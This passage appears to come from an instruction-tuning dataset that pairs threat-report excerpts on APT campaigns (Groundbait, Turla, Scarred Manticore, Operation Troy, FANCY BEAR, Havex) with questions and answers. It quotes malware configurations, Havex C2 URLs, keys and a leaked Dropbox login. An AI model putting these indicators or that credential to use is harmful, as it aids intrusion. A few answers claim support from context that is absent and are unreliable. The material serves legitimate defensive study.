sometimes staying late in the evening. This corresponds to the period 8.00 to 18.00 Eastern European Time, which would include normal Ukraine working hours.\nBased on our research and the abovementioned facts, we conclude that the attackers behind Operation Groundbait are people with an interest in surveillance or spying on separatists in the Donetsk and Luhansk regions and a few specific high-profile targets, including Ukrainian politicians. The malware operators and/ or authors have a knowledge of the Ukrainian and Russian language, and likely operate from within Ukrainian borders.\n\nWhat evidence supports the attribution of Operation Groundbait to actors operating from within Ukrainian borders, and how does the analysis of Prikormka droppers and C&C server logs contribute to this conclusion?",
    "output": "Several pieces of evidence support the attribution of Operation Groundbait to actors operating from within Ukrainian borders. First, most of Prikormka's C&C servers are located in Ukraine and hosted by Ukrainian hosting companies. Second, the group behind the threat demonstrates fluent knowledge of both Russian and Ukrainian languages, as seen in decoy documents and malware binaries. Third, PDB-paths revealed directories with names in Russian, and all analyzed Prikormka droppers contained language codes corresponding to Ukrainian (0x0422) or Russian (0x0419) in their PE resources. Fourth, the compilation timestamps of Prikormka binaries suggest that the malware authors operate in the Eastern European time zone. Fifth, C&C server logs indicate that malware operators made connections through various internet providers in Kiev and Mariupol. Additionally, the gradual switch from Russian to Ukrainian language codes in the droppers around mid-2015 further supports this attribution. The analysis of Prikormka droppers and C&C server logs reveals that the malware authors work during normal Ukrainian working hours, from 8:00 to 18:00 Eastern European Time. Based on these findings, it is concluded that the attackers have an interest in surveilling separatists in the Donetsk and Luhansk regions and specific high-profile targets, including Ukrainian politicians, and likely operate from within Ukrainian borders.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nNeuron and Nautilus are malicious tools designed to operate on Microsoft Windows platforms, primarily targeting mail servers and web servers. The NCSC has observed these tools being used by the Turla group to maintain persistent network access and to conduct network operations.\nThe Turla group use a range of tools and techniques, many of which are custom. Using their advanced toolkit, the Turla group compromise networks for the purposes of intelligence collection. The Turla group is known to target government, military, technology, energy and commercial organisations.\nThe Turla group has operated on targets using a rootkit known as Snake for many years. Like Neuron and Nautilus, Snake provides a platform to steal sensitive data, acts as a gateway for internal network operations and is used to conduct onward attacks against other organisations.\nThe Turla group are experienced in maintaining covert access through incident response activities. They infect multiple systems within target networks and deploy a diverse range of tools to ensure that they retain a foothold back onto a victim even after the initial infection vector has been mitigated.\nThe NCSC has observed both Neuron and Nautilus being used in conjunction with the Snake rootkit. In a number of instances, one or both of these tools has been deployed following the successful installation of Snake. The NCSC believes that Neuron and Nautilus are another component of the wider Turla campaign and are not acting as replacements for the Snake rootkit. It is likely that these tools have seen wider deployment since the Snake rootkit has been reported on by the information security industry, providing the group with additional methods of access.\nThis advisory provides information to detect Neuron and Nautilus infections. The NCSC encourages any organisation that has previously experienced a compromise by the Turla group to be diligent in checking for the presence of these additional tools. Whilst they are commonly deployed alongside the Snake rootkit, these tools can also be operated independently.\nQuestion: How does the Turla group maintain covert access to compromised networks, especially during incident response activities? Explain the strategies and tools they employ.",
    "output": "Answer: The Turla group maintains covert access to compromised networks through several strategies and tools. Firstly, they infect multiple systems within the target networks, ensuring redundancy. Secondly, they deploy a diverse range of tools to ensure that they retain a foothold even if the initial infection vector is mitigated. This includes the use of custom tools like Neuron and Nautilus, which are designed to operate on Microsoft Windows platforms, primarily targeting mail servers and web servers. Additionally, they use the Snake rootkit, which provides a platform to steal sensitive data, acts as a gateway for internal network operations, and is used to conduct onward attacks against other organizations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: LIONTAIL version using named pipes\nDuring our research, we also found loaders that have a similar internal structure to the LIONTAIL samples. Instead of listening on URL prefixes, this version gets its payloads from a named pipe and likely is designated to be installed on internal servers with no access to the public web. The configuration of the malware is a bit different:\nQWORD var_0\nQWORD var_8\nQWORD var_10\nDWORD var_18\nDWORD dwOpenMode\nDWORD dwPipeMode\nDWORD nMaxInstances\nDWORD nOutBufferSize\nDWORD nInBufferSize\nDWORD nDefaultTimeOut\nSTRING pipe_name\nThe main shellcode starts with (<https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora>)converting the string security descriptor \"D: (A;;FA;;;WD)\" into a valid, functional security descriptor. As the string starts with \"D\", it indicates a DACL (discretionary access control list) entry, which typically has the following format: entry_type:inheritance_flags(ACE_type; ACE_flags; rights; object_GUID; inherit_object_GUID; account_SID). In this case, the security descriptor allows (A) File All Access  (FA) to everyone (WD).\nThe security descriptor is then used to a named pipe based on the values provided in the configuration. In the samples we observed, the name of the pipe used is \\\\.\\pipe\\test-pipe.\nIt's noteworthy that, unlike the HTTP version, the malware doesn't employ any more advanced techniques for connecting to the named pipe, reading from it, and writing to it. Instead, it relies on standard kernel32.dll APIs such as CreateNamedPipe, and ReadFileWriteFile.\nThe communication of named pipes-based LIONTAIL is identical to the HTTP version, with the same encryption mechanism and the same structure of the payload which runs as a shellcode in memory.\nMedium Headline: Next stages\nTo make things more complicated, Scarred Manticore wraps the final payload in nested shellcodes. For example, one of the shellcodes received from the attackers runs another almost identical shellcode, which in turn runs a final shellcode responsible for machine fingerprinting.\nThe data gathered by this payload is collected by running specific Windows APIs or enumerating the registry keys, and includes these components:\nComputer Name (using GetComputerNameW API) and Domain Name (using GetEnvironmentVariableA API)\nFlag if the system is 64-bit (using GetNativeSystemInfo API, the check is done with wProcessorArchitecture == 9)\nNumber of processors (dwNumberOfProcessors using GetNativeSystemInfo API)\nPhysical RAM (GetPhysicallyInstalledSystemMemory)\nData from CurrentVersion registry key (Type, Name length, Name, Data length, Data)\nData fromSecureBoot\\State registry key (the same data)\nData from System\\Bios registry key (the same data)\nThe final structure, which contains all the gathered information, also has a place for error codes for the threat actor to use to figure out why some of the APIs they use don't work as expected:\nDWORD last_error (GetComputerNameW)\nDWORD last_error (GetPhysicallyInstalledSystemMemory)\nDWORD last_error (GetEnvironmentVariableA)\nDWORD last_error (NtOpenKey CurrentVersion)\nDWORD last_error (NtQueryKey CurrentVersion)\nDWORD num_of_values (CurrentVersion)\nDWORD last_error (NtOpenKey SecureBoot\\State)\nDWORD last_error (NtQueryKey SecureBoot\\State)\nDWORD num_of_values (SecureBoot\\State)\nDWORD last_error (NtOpenKey System\\Bios)\nDWORD last_error (NtQueryKey System\\Bios)\nDWORD num_of_values (System\\Bios)\nQWORD num_of_proccesors\nQWORD total_RAM\nQWORD tick_count\nQWORD is_64_bit\n_CHAR[0X10] computer_name\n_CHAR[0X10] domain_name\n_BYTE[] CurrentVersion_data\n_BYTE[] SecureBootState_data\n_BYTE[] SystemBios_data\nMedium Headline: LIONHEAD web forwarder\nOn some of the compromised exchange servers, the actors deployed LIONHEAD, a tiny web forwarder. LIONHEAD is also installed as a service using the same phantom DLL hijacking technique as LIONTAIL and utilizes similar mechanisms to forward the traffic directly to Exchange Web Services (EWS) endpoints.\nLIONHEAD's configuration is different from LIONTAIL:\nDWORD timeout 0x493E0\nDWORD forward_port 444\nSTRING end_string '<redacted>'\nSTRING forward_server 'localhost'\nSTRING forward_path '/ews/exchange.asmx'\nSTRING[] listen_urls 'https://+:443/<redacted>/'\nThe backdoor registers the listen_urls prefixes in the same way as LIONTAIL and listens for requests. For each request, the backdoor copies the content type, cookie, and body and forwards it to the <forward_server>/<forward_path>:<forward port> specified in the configuration. Next, the backdoor gets a response from forward_server and sends it back to the URL that received the original request.\nThis forwarder might be used to bypass the restrictions on external connections to EWS, hide the real consumer of EWS data being external, and consequently conceal data exfiltration.\nMedium Headline: Web shells\nScarred Manticore deploys multiple web shells, including those previously indirectly to OilRig. Some of these web shells stand out due to their obfuscations, naming conventions and artifacts. The web shells retain class and method obfuscation and a similar string encryption algorithm (XOR with one byte, the key is derived from the first byte or from the first 2 bytes) to many other web shells and .NET-based tools used by Scarred Manticore in their attacks over the past few years.\nOne of those shells is a heavily obfuscated and slightly modified version of an open-source XML/XSL transform web shell, . This web shell also contains two obfuscated functions that return the string \"~/1.aspx\". These functions are never called and likely are remnants from other versions, as we observed them in tools used previously by Scarred Manticore, such as FOXSHELL, which is discussed later:\nQuestion: How does the LIONHEAD web forwarder function and what purpose does it serve in Scarred Manticore's operations? What techniques does it use to achieve its goals?",
    "output": "Answer: The LIONHEAD web forwarder is a small component deployed on compromised exchange servers by Scarred Manticore. It is installed as a service using a phantom DLL hijacking technique and forwards traffic directly to Exchange Web Services (EWS) endpoints. Its configuration includes parameters like timeout, forward port, forward server, forward path, and listen URLs. LIONHEAD registers the listen URL prefixes and listens for requests, copying the content type, cookie, and body, and forwarding them to the specified forward server and path. It then receives a response from the forward server and sends it back to the original requester. The purpose of LIONHEAD is to bypass restrictions on external connections to EWS, hide the real consumer of EWS data, and conceal data exfiltration. This helps the threat actor maintain stealth and control over the compromised environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Attack Timeline\nOur analysis suggests the following order of these attacks. Later in this report we mention other elements that color our view of this event, but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component.\nMarch 20 attack against banks and news agencies in South Korea:\n1. The remote-access Trojan was compiled January 26, 2013.\n2. The component to wipe the master boot record (MBR) of numerous systems was compiled January 31.\n3. An initial victim within the organization was spear-phished with the remote-access Trojan. This likely occurred before March 20, and possibly weeks prior to the attack.\n4. The dropper was compiled March 20, hours before the attack occurred.\n5. The dropper was distributed to systems across the victim organizations, and within minutes of execution the MBRs were wiped. This occurred around 2:00 pm Seoul time on March 20.\nBig Headline: The adversaries\nThe two groups that appear to have been involved in the attacks have had no prior connection until now.\n\u2022 NewRomanic Cyber Army Team. The samples connected to this group are more convincing. The majority of the wipers (found in the wild and retrieved from infected systems through other sources) contain the strings \"principes\" and \"hastati,\" which also appear in a message left on one of the targeted websites in the form of a web pop-up. The wiper component also overwrote the MBR with one of these strings. The following data points support this fact:\n\u2013 The strings \"principes\"1 and \"hastati\"2 were found within the code of some of the wiper components. The same strings were also found in the web pop-up message that was left on the Nocut News Korea website. The strings are ancient Roman terms that make reference to military units, hence a \"cyberarmy.\" The pop-up even states some of the specific units that were part of hastati which were involved in this attack.\n\u2013 The remote-access Trojan that was found had a build path which included the reference \"Make Troy,\" a subdirectory of the folder \"Work.\" Troy3 refers to an ancient Roman region, again connecting the Roman references to this group, which consistently uses this theme.\n\u2022 The Whois Hacking Team. On March 20, the website of the network provider LG +U was defaced by this group. Was it a coincidence that a second group was involved? All of the evidence indicates that they had a strong involvement, but there is no solid link to the group because it did not claim involvement in the attacks. However, we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by the NewRomanic Cyber Army yet also appears to be essentially the same wiper. The Whois Hacking Team MBR wiper component includes the same graphics (in a resource file in the binary) that appeared on the defaced LG +U website, although the malware did not behave the same way. Within the main executable file, however, we discovered a small portion of the code that matched the structure of that of the NewRomanic Cyber Army wipers we found, so the Whois Team likely dropped the same wiper.\nState sponsored or not, these attacks were crippling nonetheless. The overall tactics were not that sophisticated in comparison to what we have seen before. The trend seems to be moving toward using the following techniques against targets:\n\u2022 Stealing and holding data hostage and announcing the theft. Public news media have reported only that tens of thousands of computers had their MBRs wiped by the malware. But there is more to this story: The main group behind the attack claims that a vast amount of personal information has been stolen. This type of tactic is consistent with Anonymous operations and others that fall within the hacktivist category, in which they announce and leak portions of confidential information.\n\u2022 Wiping the MBR to render systems unusable, creating an instant slowdown to operations within the target\nBig Headline: The Analysis\nWhat were the motives behind these attacks and why did the attackers chose certain targets? The attacks managed to create a significant disruption of ATM networks while denying access to funds. This wasn't the first time that this type of attack\u2014in which destructive malware wiped the systems belonging to a financial institution\u2014has occurred in South Korea. In 2011 the same financial institution was hit with destructive malware that caused a denial of service.\nThe attackers left a calling card a day after the attacks in the form of a web pop-up message claiming that the NewRomanic Cyber Army Team was responsible and had leaked private information from several banks and media companies.\nThey also referenced destroying the data on a large number of machines (the MBR wiping) and left a message in the web pop-up identifying the group behind the attacks. The page title in Internet Explorer was \"Hey, Everybody in Korea????\"\n\"Hi, Dear Friends, We are very happy to inform you the following news. We, NewRomanic Cyber Army Team, verified our #OPFuckKorea2003. We have now a great deal of personal information in our hands. Those includes; 2.49M of _ member table data, cms_info more than 50M from . Much information from\nBank. We destroyed more than 0.18M of PCs. Many auth Hope you are lucky. 11th, 12th, 13th, 21st, 23rd and 27th HASTATI Detachment. Part of PRINCIPES Elements. p.s For more information, please visit www.dropbox.com login with joseph.r.ulatoski@gmail.com::lqaz@WSX3edc$RFV. Please also visit pastebin.com.\"\nBig Headline: The Malware\nA few types of malware were involved in these attacks. Each variant had a particular use. Some public reports mentioned only the use of the wiper component; however, there were actually three components, all with a different purpose, that assisted the attackers in the campaign.\nThere were two subsequent aspects to this attack:\n\u2022 The destruction of PCs using the MBR wiper component. Occurred March 20.\n\u2022 Remote access to the targets' environments for a period prior to the attack. The duration of this access is unknown.\nBig Headline: The dropper Trojan\nThe dropper Trojan was primarily used to download the executable that destroyed the systems' MBRs. We suspect that the dropper Trojan was distributed at the time of the attacks via a compromised patch-management server that pretended to run a legitimate update.\nThe dropper Trojan was compiled March 20, the day of the attack and several hours prior to the destruction of the systems. We suspect that the attackers had access to the target environment prior to March 20. It is unlikely that a large volume of users (some 30,000+) were spear-phished on March 20 alone.\nIt's likely a much earlier compromise led to the attacks' being staged internally. Thus, there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly. The initial infection certainly could have come from a spear-phishing attack. The backdoor component was compiled in late January. The attackers could have been inside the networks since February. This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs.\nOur further analysis led us to discover additional components that support our conclusion:\n\u2022 A remote-access Trojan was discovered to have compromised some of the target environments, specifically an internal server used to distribute updates to thousands of PCs. This Trojan variant was compiled January 26, and was detected by the security industry on March 25. McAfee detects this threat as RDN/Generic PWS.y!io. This Trojan was built with the Microsoft Visual C++ Version 2.9 compiler with a file size of 47KB.\nBig Headline: MBR wiper\nWe have seen several wiper samples to date; all were compiled January 31. The wiper itself is relatively small (24KB) and is introduced into the environment via a dropper Trojan that is 418KB and was compiled the day of the attacks.\nUpon executing the malware, the main dropper (9263e40d9823aecf9388b64de34eae54) creates the file AgentBase.exe, the MBR wiper component. This file is placed in the infected user's application data folder, executes, and immediately starts the countdown to wipe the system and render it unbootable. This file was compiled approximately two months prior to the attack's taking place.\nThe main dropper component was compiled the day of the attack, March 20, at 4:07 am Seoul time. The dropper installed the wiper, which destroyed the MBRs at around 2:00 pm Seoul time. Once the dropper executed, the system were wiped within minutes. Thus, these components likely weren't distributed until the time when the attackers wished to destroy these machines.\nBig Headline: The remote-access Trojan\nIt's not widely known that the attackers used a remote-access Trojan to compromise an internal server. The attackers used this internal server to distribute the wiper component to the thousands of PCs. The remote-access Trojan had a file size of 46KB and was compiled on January 26, five days before the MBR wiper was compiled.\nAs we concluded earlier, we have determined that the attackers had access to the environment prior to wiping the systems. The remote-access Trojan was likely delivered to an internal PC via a spear-phishing campaign. From this system the attackers accessed other internal resources. The Trojan was designed to operate within Internet Explorer; it launched a hidden instance of Internet Explorer and injected itself into the running process.\nThe Trojan immediately modified the properties in the registry to allow for remote connections to the system.\n\nQuestion: What evidence supports the involvement of the NewRomanic Cyber Army Team in the Operation Troy attacks?\n\nAnswer:",
    "output": "Several pieces of evidence support the involvement of the NewRomanic Cyber Army Team. First, the strings 'principes' and 'hastati,' which are ancient Roman military terms, were found within the code of some of the wiper components and in a web pop-up message left on the Nocut News Korea website. Additionally, the remote-access Trojan had a build path that included the reference 'Make Troy,' a subdirectory of the folder 'Work.' These Roman references and themes are consistent with the group's naming and messaging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The shortest time that an organization remained compromised was less than a single month; nine share that honor: International Olympic Committee (IOC), Vietnam's government-owned technology company, a trade organization of a nation in Asia, one Canadian government agency, one US defense contractor, one US general government contractor, one US state and one county government, and a US accounting firm. I must, however, caution that this may not necessarily be an indication of the rapid reaction of information security teams in those organizations, but perhaps merely evidence that the actor was interested only in a quick smash and grab operation that did not require a persistent compromise of the victim. The longest compromise was recorded at an Olympic Committee of a nation in Asia; it lasted on and off for 28 months, finally terminating in January 2010.\nBelow is the complete list of all 71 targets, with country of origin, start date of the initial compromise and duration of the intrusions:\nBelow are the complete timelines for each year of intrusion activity. It could be an interesting exercise to map some of these specific compromises to various geopolitical events that occurred around these times. (The gaps in the timelines for continuous infections aimed at specific victims may not necessarily be an indication of a successful cleanup before a new reinfection, but rather an artifact of our log collection process that did not mark every activity that occurred on the adversary's infrastructure, potentially leading to these gaps in the data)\nSource: McAfee\nSource: McAfee\nSource: McAfee\nSource: McAfee\nSource: McAfee\nSource: McAfee\nAlthough Shady RAT's scope and duration may shock those who have not been as intimately involved in the investigations into these targeted espionage operations as we have been, I would like to caution you that what I have described here has been one specific operation conducted by a single actor/group. We know of many other successful targeted intrusions (not counting cybercrime-related ones) that we are called in to investigate almost weekly, which impact other companies and industries. This is a problem of massive scale that affects nearly every industry and sector of the economies of numerous countries, and the only organizations that are exempt from this threat are those that don't have anything valuable or interesting worth stealing.\nYou can follow Dmitri Alperovitch, vice president of threat research, McAfee, on Twitter at http://twitter.com/DmitriCyber.\n\nAnswer this question based on the above context: How does the diversity of victim organizations in Operation Shady RAT challenge traditional perceptions of targeted intrusions, and what implications does this have for cybersecurity strategies?",
    "output": "The diversity of victim organizations in Operation Shady RAT challenges traditional perceptions by demonstrating that virtually everyone is falling prey to these intrusions, regardless of their industry or size. Victims range from multinational Fortune 100 companies to small non-profit think tanks, national Olympic teams, and even computer security firms. This underscores the need for robust cybersecurity strategies that go beyond basic defenses. Organizations must implement comprehensive security measures, including regular patching, employee training on phishing awareness, and advanced threat detection systems, to protect against sophisticated and persistent threats like Operation Shady RAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group TunnelVision exploit the CVE-2018-13379 vulnerability in Fortinet FortiOS to achieve their goals?",
    "output": "CVE-2018-13379 is a path traversal vulnerability in Fortinet FortiOS that allows an unauthenticated attacker to download system files via specially crafted HTTP resource requests. TunnelVision, an APT group, has been observed exploiting this vulnerability as part of their activities. According to the context, TunnelVision is known for wide-exploitation of 1-day vulnerabilities in target regions, and CVE-2018-13379 is one of the vulnerabilities they have exploited. By exploiting this vulnerability, TunnelVision can gain unauthorized access to system files, which could potentially allow them to deploy their tunneling tools, such as Fast Reverse Proxy Client (FRPC) and Plink, to establish a foothold in the compromised network. This exploitation is consistent with TunnelVision's modus operandi of deploying tunneling tools wrapped in a unique fashion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CyberBerkut and FANCY BEAR: Not the Same, But Showing Up to the Same Party\nThroughout our research, we have focused on FANCY BEAR, an advanced persistent threat (APT) group assessed to be Russian government. CyberBerkut, on the other hand, was a referential data point when we looked at precedence for pro-Russian proxies interfering with elections. CrowdStrike assessed in its (<https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf>)2015 Global Threat Report \"there are indications that CyberBerkut has ties to Russian state security,\" but the degree of Russian government control over the group is disputed.\nThe timing of the FANCY BEAR spearphishing campaigns and the CyberBerkut attack against Leviev are interesting. The concerted FANCY BEAR spearphishing efforts over a six month timeframe in 2015 shows Moscow's clear intent to compromise Bellingcat, most likely due to their posts on key current events involving Russia. This activity was followed by a hard stop and then additional targeted efforts by CyberBerkut in early 2016, which was in-turn followed by additional FANCY BEAR spearphishing from May to July 2016. A key assumption underlying any assessment about how these activities are related stems from how an analyst assesses the motives for targeting Leviev.\nWe came up with two scenarios:\nStronger/Closer Coordination Between FANCY BEAR and CyberBerkut. In this scenario, the activities against Bellingcat are coordinated with these two entities handing off operations. The timing suggests that the state actors, looking to compromise Bellingcat, pivoted to a more aggressive attack against Leviev when the initial spearphishing campaign failed to yield the desired results. Leviev is targeted more aggressively as a means to get at Bellingcat and since he lives in Russia, state actors would have additional tools in their kit to intercept his SMS two-factor authentication messages or gain direct access to Yandex's mail servers. In this scenario, CyberBerkut functions as much as a strategic messaging outlet as the actual attacker and is subject to a much greater degree of direction and control from Moscow than previously assessed.\nThe Common Enemies Approach: Weaker/Less Coordination Between FANCY BEAR and CyberBerkut. In this scenario, the spearphishing campaigns conducted by FANCY BEAR are distinct in purpose and perpetrator from the CyberBerkut attack against Leviev. The spearphishing campaigns are more focused on Bellingcat's coverage of the MH17 shootdown and involvement in the JIT investigation. CyberBerkut targets Leviev separately after his coverage of Russian military involvement in eastern Ukraine with some assistance from supportive friends in Moscow to compromise his Yandex account. Targeting Leviev is less about a broader compromise of Bellingcat and more about harassing one journalist. In this scenario, CyberBerkut is advancing Moscow's interests and can call on the Russian intelligence services, but is still a distinct group.\nBig Headline: Leak Sites Leaking Over\nWe looked to see if we could identify other overlaps between FANCY BEAR and CyberBerkut that would help us assess which of these two scenarios was more likely. Through our research into the Bellingcat activity, we found some surprising content overlaps with DCLeaks \u2014 another assessed Russian influence outlet \u2014 and a CyberBerkut pattern of registering infrastructure that FANCY BEAR also uses. These developments move the needle slightly towards a more coordinated relationship between the two groups, but not decisively.\nComparing DCLeaks and CyberBerkut\nIn (<https://threatconnect.com/blog/does-a-bear-leak-in-the-woods/>)our previous post, we identified a website called DCLeaks as a Russian-backed influence outlet. Information shared with ThreatConnect indicates that there is an association of some kind between the Guccifer 2.0 persona and the DCLeaks website. Shortly after publication, we became aware of a cache of documents leaked on the DCLeaks site. The files were allegedly obtained via a compromise of an organization affiliated with George Soros. It is interesting to note that earlier in 2016 CyberBerkut also published files purportedly associated with Soros.\nAnalysis conducted by (<https://twitter.com/cherepanov74/status/764948917939212289>)Anton Cherepanov, a security researcher who works for ESET, suggests that the content of the two leaks are similar with at least (<https://foreignpolicy.com/2016/08/22/turns-out-you-cant-trust-russian-hackers-anymore/>)three of the Soros documents being found on both sites. The acquisition and publication of documents belonging to, or in some way associated with, the same individual is of interest as overlaps in targeting and potential similarities in stolen content could be indicative of a connection between DCLeaks and CyberBerkut. Further, as we have identified that there is a connection from DCLeaks to Guccifer 2.0 and from Guccifer 2.0 to FANCY BEAR, the overlap in leaked documents may suggest that both leak sites obtained their data from the same collection source, FANCY BEAR.\nWhile this alone isn't enough to verify a relationship between the sites, there are some other interesting similarities. Despite their statuses as a U.S.-focused whistleblower and hacktivist group respectively, the websites of both DCLeaks and CyberBerkut primarily host content that is critical of individuals and governments perceived to oppose Russian foreign and domestic policies. Both sites attempt to appeal to civilian masses in the U.S. and Ukraine respectively by calling attention to purported in the political systems.\nAleksandr Panchenko\nCyberBerkut's main domain, cyber-berkut[.]org, was registered using privacy protection through the registrar Internet.bs and\nshortly thereafter hosted using CloudFlare infrastructure. Several other CyberBerkut-related domains redirect to this website. Most of these domains were also registered using privacy protection, but one domain, cyber-berkut[.]net was registered by \"Aleksandr Panchenko\" using the email address alex_panchenko@mail[.]com. The same day the domain was registered through Reg.ru, it was later routed to CloudFlare infrastructure, suggesting that this domain was not opportunistically procured by a domain registrant in hopes they could sell it to the CyberBerkut actors.\nAdditional research into this name and email address identifies six other CyberBerkut-related domains, none of which are active currently, registered by this individual:\nCyber-berkut[.]su\nCyber-berkut[.]tk\nCyber-berkut[.]us\nCyber-berkut[.]me\nCyber-berkut[.]cz\nCyber-berkut[.]im\nWhile certainly not definitive, the use of a mail.com email address to register domains is consistent with recently identified FANCY BEAR registration activity against the (<https://threatconnect.com/blog/fancy-bear-it-itch-they-cant-scratch/>)DCCC, (<https://threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)WADA, and CAS.\nBig Headline: Tracing out FB Infrastructure Based on Bellingcat Input\nThe activity that Bellingcat alerted us to provided a plethora of domains, IP addresses, email addresses, and other registration and hosting information for us to pivot off of to identify other pertinent infrastructure. In an upcoming blog post, we'll seek to identify as much FANCY BEAR infrastructure and aliases as possible using the ThreatConnect platform and capabilities from some of our industry partners.\nReviewing the CATA501836 and Carbon2u name servers, we were able to identify dozens of active domains that fit the FANCY BEAR mold and likely spoof organizations that Moscow would seek to compromise.\nPivoting off of Bellingcat's email headers we were able to identify hundreds of domains and IPs, and dozens of email addresses and aliases most likely used by FANCY BEAR, some of which were not previously identified. This review primarily identified historical FANCY BEAR information, but the conclusions from it help verify FANCY BEAR TTP assessments, provide additional\ntargeting context, and may be useful in retrospective reviews of malicious activity.\nMedium Headline: Conclusion\nThe campaign against Bellingcat provides yet another example of sustained targeting against an organization that shines a light on Russian perfidy. The spearphishing campaign is classic FANCY BEAR activity while CyberBerkut's role raises yet more questions about the group's ties to Moscow. These end-to-end cyber operations begin with targeting and exploitation and end with strategic leaks and other active measures employed against those with whom they disagree.\nThese efforts go above and beyond traditional intelligence requirements such as gaining insight into a sensitive project or sources. Vilifying the messenger and dumping their personal data is part of the game, intended to intimidate and embarrass those that speak ill of Moscow. If Russia is willing to go to these lengths to compromise a small journalist organization and its contributors, consider what they are willing to do to major news and media outlets that publish similar articles. While many organizations remain reticent to share information, this knowledge is the prerequisite to establishing how widespread such efforts are and the adversary's modus operandi.\nThe BEARs win if their active measures campaigns push, scare, or intimidate their targets into doing what they want. If you encounter a BEAR, you're doing something right. Don't back down. And turn on two-factor authentication for everything.\n\nAnswer this question based on the above context: What are the two main scenarios proposed to explain the relationship between FANCY BEAR and CyberBerkut in their activities against Bellingcat?",
    "output": "The two main scenarios proposed are: 1. Stronger/Closer Coordination Between FANCY BEAR and CyberBerkut, where the activities are coordinated with these two entities handing off operations, and the state actors pivoted to a more aggressive attack against Leviev when initial spearphishing failed. In this scenario, CyberBerkut functions as both a strategic messaging outlet and the actual attacker, subject to a greater degree of direction and control from Moscow. 2. The Common Enemies Approach: Weaker/Less Coordination Between FANCY BEAR and CyberBerkut, where the spearphishing campaigns conducted by FANCY BEAR are distinct in purpose and perpetrator from the CyberBerkut attack against Leviev. Here, the spearphishing campaigns focus on Bellingcat's coverage of the MH17 shootdown and involvement in the JIT investigation, while CyberBerkut targets Leviev separately after his coverage of Russian military involvement in eastern Ukraine with some assistance from Moscow.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Example request:\ndreamsblock.com (ekiaiokqmo.c08.mtsvc.net, 205.186.179.176) POST /witadmin/modules/source.php?id=28805135293025919409009AFDA8-25&v1=038&v2=17039 3861&q=5265882854508EFCF958F979E4\n\u2022 Read the HTML file returned by the server, look for havex markers and copy data from between them\n\u2022 Write the data to: %TEMP%\\<rand>.tmp.xmd\n\u2022 Decrypt/decompress content of xmd file to %TEMP%\\<rand>.dll\n\u2022 Load the DLL\nAt the moment of analysis, URLs from config were not returning any data:\nstalprof.com.ua/includes/domit/src.php (server39.hosting.reg.ru, 37.140.193.27)\n404\nzhayvoronok.com/wp-includes/pomo/idx.php (78.63.99.143)\n404\ndreamsblock.com/witadmin/modules/source.php\n<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'>\n</head><body>No data!<!--havexhavex--></body></head>0.\nEncryption\nThe 2nd stage modules are usually base64 encoded, bzip2 compressed and XORed using the recurrent \"1312312\" key.\nIn some cases, the malware can also use one 1024 bit RSA key which is embedded in the config section of the binary.\nKey from resource/config:\nBase64 encoded:\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb 5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\nDecoded RSA 1024 bit key:\n0000000: 0004 d79f e322 c0bb bec4 2a0c 1bb4 aa63 .....\"....*....c\n0000010: 5b90 c409 35a8 b772 a040 fd2f 1215 42bd [...5..r.@./..B. 0000020: 99fe 0b2b 1c8b 204e f2bd 02eb 1d16 8fbd ...+.. N........ 0000030: 7f30 317f 5cd7 8f8d bcf3 4fa4 5269 2d99 .01.\\.....O.Ri-. 0000040: 56f9 1d26 22f1 3dbb 439e 1e43 864b 5052 V..&\".=.C..C.KPR 0000050: 8f29 9b2d 8077 303d 51c6 770a 6699 19a4 .).-.w0=Q.w.f... 0000060: d3d7 cbdc a19d f52a 91eb 432f ed0b 49e1 .......*..C/..I. 0000070: 5c06 0eaa f33a 36be 325e 1223 b7ba d02e \\....:6.2^.#.... 0000080: 2a0d\nKey hardcoded in binary:\nBase64 encoded:\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe v4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648=\nDecoded:\nAnalysis of other versions of the HAVEX loader\nIMPORTANT: For versions 03-0E, 010, 011, 015, 016, 023, 026-028, 02A-02F, and 031-036 no samples are known at the moment.\nDifferences between versions\nIt seems there are over 50 different versions of Havex malware, internally identified by hex numbers from 01 to 044 (the latest known at the time of writing).\nVersions 01 \u2013 019: Contain strings that may be related to password harvesting, even though the code that would actually search for the passwords was not identified inside this component. It's possible that these strings are part of the configuration and are used by downloaded modules as a list of names of processes that the malware wants to hijack in order to steal passwords from the memory.\nVersions 017 \u2013 037: Instead of the GET request, send a POST request to the C2. The contents of the POST differ between versions.\nVersions 01A \u2013 038: Check proxy settings in the registry and use them if required.\nVersions 01B \u2013 